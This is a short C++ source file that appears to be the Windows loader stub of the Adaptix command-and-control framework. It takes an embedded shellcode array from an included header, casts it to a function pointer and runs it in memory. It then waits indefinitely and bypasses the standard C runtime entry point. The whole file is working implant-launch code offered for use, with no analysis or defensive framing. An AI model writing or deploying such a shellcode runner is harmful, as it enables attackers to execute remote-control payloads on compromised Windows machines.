#include <Adaptix.h>
#include <Shellcode.h>

auto Runner( VOID ) -> VOID {
    VOID ( *Adaptix )( VOID ) = ( decltype( Adaptix ) )Shellcode::Data;
    Adaptix();
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ CHAR*     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    Runner();
    WaitForSingleObject( (HANDLE)-1, INFINITE );
}

extern "C" VOID WinMainCRTStartup( VOID ) {
    INT32 ret = WinMain( NULL, NULL, NULL, 0 );
    ExitProcess( (UINT)ret );
}
